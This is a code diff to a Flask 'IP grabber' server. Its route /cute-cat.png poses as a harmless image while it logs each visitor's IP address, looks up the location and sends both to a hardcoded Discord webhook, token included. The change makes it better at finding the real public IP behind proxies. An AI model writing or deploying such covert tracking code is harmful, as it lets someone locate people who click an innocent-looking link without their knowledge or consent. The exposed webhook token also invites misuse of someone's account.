@@ -1,11 +1,20 @@
 from flask import Flask, request, send_file
 import requests
+import ipaddress
+import os
 
 print("🚀 Flask server started...")
 
 app = Flask(__name__)
 
-webhook_url = "https://discordapp.com/api/webhooks/1359476486599475300/lPlfpFf4XVEeY6qyEFfF6CDU5LhfzK1VPknrUA2CNU5hXNNmIKlOL913qMUzvf2Op4bw"  # 👈 Replace with your actual webhook
+# 👇 Replace this with your actual webhook
+webhook_url = "https://discordapp.com/api/webhooks/1359476486599475300/lPlfpFf4XVEeY6qyEFfF6CDU5LhfzK1VPknrUA2CNU5hXNNmIKlOL913qMUzvf2Op4bw"
+
+def is_public_ip(ip):
+    try:
+        return ipaddress.ip_address(ip).is_global
+    except ValueError:
+        return False
 
 def get_ip_location(ip):
     try:
@@ -32,7 +41,14 @@ def send_ip_to_discord(ip):
 
 @app.route('/cute-cat.png')
 def grab_ip_and_serve_image():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    # Get list of IPs from X-Forwarded-For
+    forwarded_for = request.headers.get('X-Forwarded-For', '')
+    ip_list = [ip.strip() for ip in forwarded_for.split(',')] if forwarded_for else []
+    public_ips = [ip for ip in ip_list if is_public_ip(ip)]
+
+    # Choose the first public IP or fallback to remote_addr
+    ip = public_ips[0] if public_ips else request.remote_addr
+
     print(f"[📡] Incoming IP: {ip}")
     send_ip_to_discord(ip)
 
@@ -46,8 +62,6 @@ def grab_ip_and_serve_image():
 @app.route('/')
 def home():
     return "✅ IP grabber is live"
-
-import os
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
